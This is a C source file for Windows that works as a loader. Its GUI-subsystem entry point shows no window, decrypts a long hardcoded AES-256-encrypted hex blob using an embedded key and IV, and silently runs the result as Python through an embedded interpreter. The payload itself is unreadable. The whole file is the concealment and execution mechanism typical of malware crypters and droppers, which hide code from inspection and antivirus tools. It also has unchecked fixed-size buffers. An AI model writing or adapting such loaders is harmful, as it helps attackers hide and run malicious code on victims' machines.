#include <openssl/aes.h>
#include <openssl/rand.h>
#include <openssl/rsa.h>
#include <openssl/pem.h>
#include <openssl/err.h>
#include <openssl/applink.c>
#include <python3.11/Python.h>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define AES_KEY_BITS 256
#define AES_IV_SIZE 16

void hex_to_string(const unsigned char *hex_array, size_t len, unsigned char *decoded_string) {
    if (len % 2 != 0) {
        printf("Error: hex_array length is not even.\n");
        return;
    }

    for (size_t i = 0; i < len / 2; i++) {
        sscanf((const char *)&hex_array[i * 2], "%2hhx", &decoded_string[i]);
    }
}

void decrypt_aes(const unsigned char *aes_key_hex, const unsigned char *aes_iv_hex, 
                  const unsigned char *input_hex, unsigned char **result, size_t *result_len) {
    unsigned char aes_key[AES_KEY_BITS / 8];
    unsigned char aes_iv[AES_IV_SIZE];
    
    hex_to_string(aes_key_hex, strlen((const char *)aes_key_hex), aes_key);
    hex_to_string(aes_iv_hex, strlen((const char *)aes_iv_hex), aes_iv);

    unsigned char input[20000];
    size_t input_len = strlen((const char *)input_hex) / 2;
    hex_to_string(input_hex, strlen((const char *)input_hex), input);

    unsigned char buffer[1024];
    unsigned char plaintext[1024 + EVP_MAX_BLOCK_LENGTH];
    EVP_CIPHER_CTX *ctx;
    int len, plaintext_len;
    size_t total_plaintext_len = 0;
    size_t buffer_size = sizeof(plaintext) * 2;
    unsigned char *full_plaintext = malloc(buffer_size);

    if (!full_plaintext) {
        perror("Unable to allocate memory");
        exit(EXIT_FAILURE);
    }

    ctx = EVP_CIPHER_CTX_new();
    EVP_DecryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, aes_key, aes_iv);

    const unsigned char *ptr = input;
    size_t remaining_len = input_len;

    while (remaining_len > 0) {
        size_t chunk_size = (remaining_len > sizeof(buffer)) ? sizeof(buffer) : remaining_len;
        memcpy(buffer, ptr, chunk_size);

        if (!EVP_DecryptUpdate(ctx, plaintext, &plaintext_len, buffer, chunk_size)) {
            ERR_print_errors_fp(stderr);
            exit(EXIT_FAILURE);
        }
        if (total_plaintext_len + plaintext_len > buffer_size) {
            buffer_size *= 2;
            full_plaintext = realloc(full_plaintext, buffer_size);
        }
        memcpy(full_plaintext + total_plaintext_len, plaintext, plaintext_len);
        total_plaintext_len += plaintext_len;

        ptr += chunk_size;
        remaining_len -= chunk_size;
    }

    if (!EVP_DecryptFinal_ex(ctx, plaintext, &plaintext_len)) {
        ERR_print_errors_fp(stderr);
        exit(EXIT_FAILURE);
    }
    memcpy(full_plaintext + total_plaintext_len, plaintext, plaintext_len);
    total_plaintext_len += plaintext_len;

    full_plaintext[total_plaintext_len] = '\0';
    EVP_CIPHER_CTX_free(ctx);

    *result = full_plaintext;
    *result_len = total_plaintext_len;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    
    unsigned char aes_key_hex[] = "dc0e68af5e37726d7cf51a88c19028c202f249e9857978a5a0702ced91227327";
    unsigned char aes_iv_hex[] = "d48e8f872066162eabde33152dc604c6";
    unsigned char input_hex_py[] = "2eeafe63e0262d9ac74f40d9528c870716153e6fb07c157929ef8385d8c5e7582a05f596cf4b80e929d6ecf7fca05569130e4a1dd0e9b2a9489f4bebfb49f6b1544ec116a2d190713d9e73e232b69c672f26c6d4b725db4794aa44c78d76fae2a15881e80af05af95d2a37d3dd4ec616ff57313452c897f011cfc1ded2de268c9b9a0d027d35bf08909ca738bcb33fd633d4d9c3cc3a59ac284f9a1e4786fb10a1b57505199264b649e000a47c5a18ec1c19ceaa4d6bafe61474a3c2e69d03432039f40d6025cf9f430005a917dca24db2641d5172d0411d93b83b2fcbc3c083bd998777aca9adb76da7b2c6db0ccaec09a3542ca28abe0f29a5c9aed5e99fb68d6358f23f21685c491af90c6a59c3f2addcdb3e3e29527fd07c39c56b8e12411a5e72567c4a8babb2261d42c4f688e75eba8a66128e60627c9e5c6f0bbb98550b7027a79aaca5d3c27c8bf74e190d7fc834e77395644670a4b1e2bc381e3b679a1cc8e2bb24b92cc361afeb2d15ade0379fce5c1f9dd4bda93695526c452acfbc0fbad7a95e02542fc7ad9add9128485693d31f0f785f3cc8d20ee4655b4de4140cb577eb1a2c4325b0eb87e3760223f807b7e7ee56286ea431a5231ebe04bca8f126c76ea701495e4daa2bdf13a044e082ce9bde725c1e2df874e624ef85f446907e34eaa8bcd84502060540f21f2e88786187443de4c2bf8196d8d7b4aeb1b2d5ae4f2d15ecc4bcb9e631ee93ea12694b8c2788d326a1a4d1310eec2fab32f7519589188fe7a9b4a05b197eaaefda693a6234b73e2f3829e478f33b549d1e5bd56b225fda888d97add4eac93b519cde297ca2e84c198db80cb9bccf216236bb14f1f652c11fa1a6b28c949d4a3fa582099dc0ce894ab1c4d3e30d20cc357dd32865f36c93706b591bd29877697e6bf3961d5cc7cf62b1b4d59d3467f1169b75f84a34989bd875e707331ea55e401d2ed05b82554cd47f80f485f91074bfc52717d234184f921d663a8e66e3f24d6645cb80c37d86d7a4fe3f2a4a4774b2a039fd655447aec6f80925c4bb590799a25e7d7ea80a5e9a7456a05db8992805dab5eb74e8b2bbd16fd508cfc800c351978f141d3a4eac10b828708f8682d36fceae5e727fbb6e6402467bcaefa0a9c7aff861d6361128f0e8fef3b1389a40a9874fb79e02f628bcba87daf83da276670711a035c3d6a4404d3c3c3a05b5724b95adb60fd725005020375f5faf18dc5988da5a6ed665e26b644c8e7d2a6c1d3f165ce254e2d29db69a554b8a1d357fa9ca5b8bf8d46c2a8da9274a03f983fa7299c6b4e4cd89c6c27a6dee8072a42225e8129131b36d646c32117eba0a4cf2746f7080a008e74edaf801db286fb3d919a5eafb190850a0efcf337a56ebd0fcdc0ffb211f5f254352509d7bdae7a517b065162b62745bcdc371cd15306c16c23a486c57151ab985362c6341f0f780c3a2fe2b1129307a325e2a9cde86d2ea8e6a62bf30fdadc5f145f28219a6111d6256e12a2be95be470042d05ca87e1cf04232afb58a70f05db37094ba0f4a410d69f8f0ac4f9ac99fb910d01131e371abf25f851676be5ac1fc76039abd72ac69a2e65e4d8c54c7a71014dcf569c590030e961477c59740997710519206e241adc85c52cdd71f1052977f2759776ef66f054cd833b6e0f92ed8605f01c9d8bd4ab63e77cd5bf08d9cd908e1b8d64c7a4653e2f4cefa598be5200cc21aa85a4c443807083d340037b5e3bf85ba15d9d11d18486b1fd04c1ee4a2a906cfb6a0d6f6ca24a343320319a9c7961d748531bc6ca4afef3a56daec20b98447fd3c366772402010b94c3d26bc7b7c43a19a2dd4c8cb35dd481f78de20c091d8de8211315e524177d94f20e5fcdaee90d9413fef0181430b7a67a31b07b0494107592341ff780aad455c1d43a33d79f63e659dcd17d8ca5b1a6e7f2e09f99f1672d7036bd0070c5ecf455f5559ad0024ed72a303c59f872a77f282bfe1b54ad2edd8f0f8631e87ae58987688e4db56dae220321bd312bf197b321c90501389b419cadf8de013f50edb3db94ef92de5d7cf01701a19d72c37675aa0c3fd285ce5792f788aa63cda513bc5609bc02414d1b07cb739592861b5aa43df9ee0d4d13cb144b08360c32bb6da9470622cf124e0f144c4f012e02618b9e5de4121d5a8605fb7189a72cdb032e8855874f53b7655cd8706416e916c672faed6aff4ff762ccad61b6d9c5e47a";
    unsigned char *decrypted_text = NULL;
    size_t decrypted_len = 0;

    decrypted_len = 0;


    decrypt_aes(aes_key_hex, aes_iv_hex, input_hex_py, &decrypted_text, &decrypted_len);

    if (decrypted_text) {
        Py_Initialize();
        PyEval_InitThreads();

        PyGILState_STATE gstate = PyGILState_Ensure();
        PyRun_SimpleString((const char *)decrypted_text);

        PyGILState_Release(gstate);
        Py_Finalize();

        free(decrypted_text);
    }

    return 0;
}
